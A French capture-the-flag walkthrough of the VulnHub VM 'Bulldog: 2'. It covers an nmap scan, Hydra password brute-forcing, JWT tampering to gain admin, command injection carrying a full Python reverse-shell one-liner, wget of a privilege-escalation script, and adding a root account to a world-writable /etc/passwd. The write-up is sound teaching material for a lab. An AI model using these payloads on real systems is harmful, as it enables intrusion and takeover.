# Bulldog: 2

[Bulldog: 2](https://www.vulnhub.com/entry/bulldog-2,246/) est une machine virtuelle vulnérable, conçue par [le chercheur en sécurité Nick Frichette](https://frichetten.com/), et publiée sur VulnHub au mois de juillet 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. Il s'agit de la deuxième VM de la série Bulldog ; j'ai eu un réel plaisir à travailler sur la première VM Bulldog: 1, à la résoudre et à en rédiger l'article détaillé ([disponible sur ce Github](/CTF-VulnLabs/bulldog1)). C'est parti pour ce nouveau _walkthrough_ ! Attention, spoilers...

## Synopsis

Trois ans se sont écoulés depuis le vol de données bancaires dont a été victime _Bulldog Industries_, à l'époque leader mondial de la vente de photographies haute résolution de [bulldogs anglais](https://fr.wikipedia.org/wiki/Bulldog_anglais) (peut-on parler dans ce cas de marché de niche ?). Entretemps, son PDG Winston Churchy a fait preuve de résilience 2.0 et a entrepris de bâtir un nouveau modèle économique, bien plus révolutionnaire que le précédent : un réseau social, sobrement intitulé _Bulldog.social_ !

Contrairement au premier challenge où notre mission consistait à enquêter sur une VM compromise (donc davantage dans un rôle de _blue team_), nous sommes cette fois-ci conviés à compromettre leur serveur de production. S'agit-il d'un ordre de mission pour des tests d'intrusion, commandités par le PDG ? Ou bien avons-nous été secrètement approchés par l'odieux gang des [bergers allemands](https://fr.wikipedia.org/wiki/Berger_allemand) _German Shepherd Hack Team_, afin de semer le désordre chez leurs ennemis d'outre-Manche ? Mystère et bull de dog.

## À la recherche d'un os à ronger

L'adresse IP de la VM Bulldog nous est gracieusement fournie à l'écran d'ouverture de session : 192.168.56.101.

Un scan [__nmap__](https://nmap.org/book/man.html#man-description) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation.

```console
root@blinils:~# nmap -sT -sV -p- -A 192.168.56.101

--snip--
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Bulldog.social
MAC Address: 08:00:27:AC:F1:85 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
--snip--
```

Seul le port 80 est ouvert, il s'agit du site Web de _Bulldog.social_. Sa page d'accueil est notamment caractérisée par la ravissante photographie d'un bulldog anglais (probable clin d'oeil à leur business model précédent), dont on ne saurait dire s'il vous câlinera affectueusement ou vous pourchassera sans relâche à la moindre tentative de connexion au site. Le réseau social se targue d'avoir fédéré plus de 15000 membres en très peu de temps ; toutefois, les inscriptions au site sont fermées... tiens tiens, en raison de problèmes de sécurité ! _"Unfortunately we are not accepting registrations at this time due to security concerns. If needed, please reach out to a customer support representative to create a commercial account."_

![Affichage de l'image bulldog.jpg](images/bulldog.jpg)

Un message de Winston Churchy a été publié sur la page ```About us```. Le PDG revient sur l'incident de sécurité dont a été victime _Bulldog Industries_ trois années auparavant : une exfiltration de leur base de données, orchestrée par le gang des bergers allemands _German Shepherd Hack Team_, et qui a entraîné le licenciement de tout le personnel technique puis une cessation d'activités. Néanmoins, l'entreprise s'est donné un mal de chien pour rebondir et il n'y a pas photo (fini les photos !), _Bulldog Industries_ a depuis repris du poil de la bête, comme en témoignent les chiffres évoqués par Churchy.

Enfin, la rubrique ```Users``` met en lumière les membres les plus actifs du mois écoulé. Neuf _Bullies_ ont ainsi leur portrait sur ce Hall of Fame : Berna Phillips (lrberna), LeeAnn Pham (anleeann), Vijay Wells (eivijay), Tonia Andersen (eitonia), Adolpho Kirby (ipadolpho), Angelo Wood (dnangelo), Fabien Stevens (sffabian), Rudie Ramirez (mdrudie) et Margarette Roberts (srmargarette). Il s'agit là d'une véritable aubaine car, à défaut de pouvoir nous créer un compte sur le réseau social, nous avons en notre possession les noms de neuf comptes utilisateurs... et si cela se trouve, peut-être que l'un d'entre eux n'est pas protégé par un mot de passe robuste...

![Affichage de l'image top_monthly_users.png](images/top_monthly_users.png)

## Hydra - Le deuxième travail d'Hercule

Lors d'une tentative de connexion avec le couple d'identifiants ```user1:password1```, le serveur nous renvoie un code erreur [_401 Unauthorized_](https://tools.ietf.org/html/rfc7235#section-3.1). Le but ici va être d'automatiser la recherche de logins/mots de passe valides avec l'outil [__Hydra__](https://sectools.org/tool/hydra/), en lui donnant les paramètres adéquats : format de la requête, liste de logins, liste de mots de passe, conditions d'arrêt/de succès...

```console
POST /users/authenticate HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Referer: http://192.168.56.101/login
Content-Length: 52
DNT: 1
Connection: keep-alive
{
  "username": "user1",
  "password": "password1"
}

HTTP/1.1 401 Unauthorized
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Aug 2018 11:11:11 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 41
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
```

Neuf utilisateurs ont été trouvés sur le site Internet de _Bulldog.social_, autant se focaliser sur eux et essayer de trouver leur mot de passe. Le wiki [SkullSecurity](https://wiki.skullsecurity.org/Passwords) propose un large panel de dictionnaires : le premier à être utilisé, au nom particulièrement évocateur, est ```500-worst-passwords.txt```.

```console
root@blinils:~# hydra -v -V -L users.txt -P 500-worst-passwords.txt -s 80 192.168.56.101 http-post-form "/users/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Cookie: test:H=Content-Type: application/json:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://192.168.56.101/login:H=Connection: keep-alive" -w 2

--snip--

[DATA] max 16 tasks per 1 server, overall 16 tasks, 4500 login tries (l:9/p:500), ~282 tries per task

--snip--

[ATTEMPT] target 192.168.56.101 - login "lrberna" - pass "123456" - 1 of 4500 [child 0] (0/0)
[ATTEMPT] target 192.168.56.101 - login "lrberna" - pass "password" - 2 of 4500 [child 1] (0/0)
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
[ATTEMPT] target 192.168.56.101 - login "lrberna" - pass "12345678" - 3 of 4500 [child 2] (0/0)
[ATTEMPT] target 192.168.56.101 - login "lrberna" - pass "1234" - 4 of 4500 [child 3] (0/0)
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.

--snip--

[80][http-post-form] host: 192.168.56.101   login: eivijay   password: 12345

--snip--

[80][http-post-form] host: 192.168.56.101   login: mdrudie   password: qwerty

--snip--

[STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests)
1 of 1 target successfully completed, 2 valid passwords found
```

Deux mots de passe ont été trouvés : ceux des comptes de Vijay Wells (eivijay) et de Rudie Ramirez (mdrudie). Néanmoins, une fois connecté sur leur profil respectif, aucune interaction ne semble autorisée : il n'est pas possible de modifier le pseudo, l'adresse e-mail enregistrée ou encore l'avatar. Dommage, la piste de l'upload d'un _webshell_ semblait la plus probable. Poursuivons les investigations sur le site !

## Level up! avec les JSON Web Tokens

L'analyse des échanges avec le proxy [__Burp__](https://portswigger.net/burp/documentation/desktop/getting-started/proxy-setup/browser), entre le navigateur et le serveur permet d'avancer : un [_JSON Web Token_](https://en.wikipedia.org/wiki/JSON_Web_Token) est créé avec les informations de l'utilisateur.

```console
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 16 Aug 2018 13:07:48 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 454
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"1c6-/88f6kDSzIXKdTBvko4UfYEKWoY"

{"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJSdWRpZSBSYW1pcmV6IiwiZW1haWwiOiJydWRpZXJhbWlyZXpAaGFwcHltYWlsLmNvbSIsInVzZXJuYW1lIjoibWRydWRpZSIsImF1dGhfbGV2ZWwiOiJzdGFuZGFyZF91c2VyIiwicmFuZCI6MjF9LCJpYXQiOjE1MzQ0MjQ4NjgsImV4cCI6MTUzNTAyOTY2OH0.MnCH5VJOwHO_7sweYwwmUajaXRul7pXqlANLOwW0p04","user":{"name":"Rudie Ramirez","username":"mdrudie","email":"rudieramirez@happymail.com","auth_level":"standard_user"}}
```

Oh, intéressant ! Il semblerait qu'il faille modifier le paramètre ```auth_level``` afin d'augmenter nos privilèges. Oui mais par quoi ? ```admin``` ? ```admin_user``` ? ```super_user``` ? La réponse se trouve en réalité dans l'un des fichiers JS, ```main.8b490782e52b9899e2a7.bundle.js```, où à un endroit du code, la valeur ```auth_level``` est comparée à ```master_admin_user```.

Bingo, il suffit alors de modifier le token et les informations associées, à l'aide du site https://jwt.io par exemple. Une fois la valeur ```auth_level``` modifiée, on obtient un token tout à fait différent, que l'on passe à __Burp__ en ayant cliqué au préalable sur _Action_ > _Do intercept_ > _Response to this request_ et bingo, nous sommes admin !

![Affichage de l'image JSON_Web_tokens.png](images/JSON_Web_tokens.png)

Prochaine étape : un _Admin Dashboard_ ayant l'apparence d'un formulaire de login. Les couples d'identifiants trouvés plus tôt, à savoir ```eivijay:12345``` et ```mdrudie:qwerty``` ne fonctionnant pas, il va falloir trouver autre chose. L'indice qui nous met la puce à l'oreille (itchy.. ça gratte !) est _Please authenticate with the Link+ CLI Tool to use Link+_. Une interface en ligne de commande ? Se pourrait-il qu'il s'agisse d'une injection de commandes ? Après quelques tests, la réponse est oui !

![Affichage de l'image admin_dashboard.png](images/admin_dashboard.png)

Le premier test est concluant avec ```username=test``` && ```password=test|ping -c2 192.168.56.102``` car notre machine reçoit bien les trames ICMP _echo request_ et renvoie des _echo reply_.

```console
root@blinils:~# tcpdump -i eth0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
16:16:16.123293 IP 192.168.56.101 > blinils: ICMP echo request, id 3009, seq 1, length 64
16:16:16.123315 IP blinils > 192.168.56.101: ICMP echo reply, id 3009, seq 1, length 64
16:16:17.125145 IP 192.168.56.101 > blinils: ICMP echo request, id 3009, seq 2, length 64
16:16:17.125170 IP blinils > 192.168.56.101: ICMP echo reply, id 3009, seq 2, length 64
```

Un _reverse shell_ avec Python a particulièrement bien fonctionné par la suite. ```nc -nlvp 12345``` sur notre machine, ```test|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'``` dans le champ ```password``` et nous obtenons notre shell !

```console
root@blinils:~# nc -nlvp 12345
listening on [any] 12345 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 58496
bash: cannot set terminal process group (835): Inappropriate ioctl for device
bash: no job control in this shell
node@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ 
```

## Bulldog ou Cerbère ? Le douzième travail d'Hercule

Le script [__linuxprivchecker.py__](https://github.com/sleventyeleven/linuxprivchecker) développé par Mike Czumak (@SecuritySift) va scanner un certain nombre d'éléments sur le serveur : configuration de la machine, version du noyau Linux, listing des utilisateurs et de leurs privilèges, fichiers aux droits trop permissifs... et renvoie à la fin du scan une liste d'exploits censés permettre une élévation de privilèges.

```console
node@bulldog2:/tmp$ wget -q http://192.168.56.102:1234/linuxprivchecker.py 
wget -q http://192.168.56.102:1234/linuxprivchecker.py

node@bulldog2:/tmp$ python linuxprivchecker.py
python linuxprivchecker.py
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel
    Linux version 4.15.0-23-generic (buildd@lgw01-amd64-055)
	(gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018

[+] Hostname
    bulldog2

[+] Operating System
    --snip--
    Author: Nick Frichette
    Twitter: @frichette_n
    Goal: Get root, read the flag in /root
    IP Address: \4{enp0s3}
    Have fun!

--snip--

[+] All users
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    --snip--
    admin:x:1000:1004:admin:/home/admin:/bin/bash
    mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin
    node:x:1001:1005:,,,:/home/node:/bin/bash

[+] Current User
    node

[+] Current User ID
    uid=1001(node) gid=1005(node) groups=1005(node)

--snip--

[+] World Writable Files
    -rwxrwxrwx 1 root root 1754 Aug  5 21:44 /etc/passwd
    --w--w--w- 1 root root 0 Aug 16 14:54 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
    --w--w--w- 1 root root 0 Aug 16 14:54 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
    --w--w--w- 1 root root 0 Aug 16 14:54 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
   
--snip--
```

Magnifique, le fichier [```/etc/passwd```](https://fr.wikipedia.org/wiki/Passwd) est en lecture/écriture pour tout le monde ! Ordinairement, les mots de passe hashés de chaque compte Unix sont stockés dans le fichier [```/etc/shadow```](http://www.linux-france.org/article/sys/lame/html/x829.html), qui n'est accessible en lecture que par le compte root. Le fichier ```/etc/passwd```, quant à lui, contient la liste des utilisateurs et leurs informations respectives (numéro d'identification, groupe associé, répertoire personnel...). Cependant, si un hash est présent dans ```/etc/passwd``` pour un utilisateur donné, il sera tout de même pris en compte par le système !

Le but du jeu va alors consister à ajouter un compte dans ```/etc/passwd```, à lui affecter des valeurs (UID, GID...) équivalentes à root ainsi qu'un mot de passe, et à se connecter avec !

```console
node@bulldog2:/tmp$ openssl passwd -1 -salt blinils passblinils
openssl passwd -1 -salt blinils passblinils
$1$blinils$GMS/wYlG5LdvPsTaINMqH0

node@bulldog2:/tmp$ echo "blinils:\$1\$blinils\$GMS/wYlG5LdvPsTaINMqH0:0:0::/tmp/blinils:/bin/bash" >> /etc/passwd
/blinils:/bin/bash" >> /etc/passwdlG5LdvPsTaINMqH0:0:0::/tmp/

node@bulldog2:/tmp$ su - blinils
su - blinils
Password: passblinils

No directory, logging in with HOME=/
root@bulldog2:/# id
id
uid=0(root) gid=0(root) groups=0(root)

root@bulldog2:/# cat /root/flag.txt
cat /root/flag.txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

I'm already working on another more challenging VM. Follow me for updates.
```

Un grand merci à [Nick](https://frichetten.com/) pour cette série Bulldog, deux VM vraiment très chouettes à résoudre ! Vivement les prochaines !